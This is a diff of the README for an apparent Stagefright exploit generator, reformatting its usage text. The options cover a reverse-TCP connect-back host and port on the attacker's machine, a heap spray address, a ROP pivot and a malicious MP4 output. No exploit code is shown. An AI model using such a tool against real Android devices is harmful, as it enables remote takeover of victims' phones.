@@ -6,16 +6,17 @@ and start reverse TCP listener on attacker machine.
 ### author: vvn (eudemonics)  
 ### built upon original exploit code from @jduck
 
-usage: ./stagefright.py [-h] [-c CBHOST] [-p CBPORT] [-s SPRAY_ADDR] [-r ROP_PIVOT]
-              [-o OUTPUT_FILE]
+####**usage:**  
+./stagefright.py [-h] [-c CBHOST] [-p CBPORT] [-s SPRAY_ADDR] [-r ROP_PIVOT]
+              [-o OUTPUT_FILE]  
 
-optional arguments:
-  -h, --help            show this help message and exit
-  -c CBHOST, --connectback-host CBHOST (default is whatever ifconfig tells it)
-  -p CBPORT, --connectback-port CBPORT (default is 54321)
-  -s SPRAY_ADDR, --spray-address SPRAY_ADDR
-  -r ROP_PIVOT, --rop-pivot ROP_PIVOT
-  -o OUTPUT_FILE, --output-file OUTPUT_FILE
+####**optional arguments:**  
+    -h, --help: show help message and exit  
+    -c CBHOST, --connectback-host CBHOST: host address to listen for incoming TCP connection from victim (default is whatever ifconfig tells it)  
+    -p CBPORT, --connectback-port CBPORT: port for reverse TCP listener (default is 54321)  
+    -s SPRAY_ADDR, --spray-address SPRAY_ADDR: address for heap spray entry  
+    -r ROP_PIVOT, --rop-pivot ROP_PIVOT: stack pivot  
+    -o OUTPUT_FILE, --output-file OUTPUT_FILE: generated MP4 file  
 
 Original README:
 
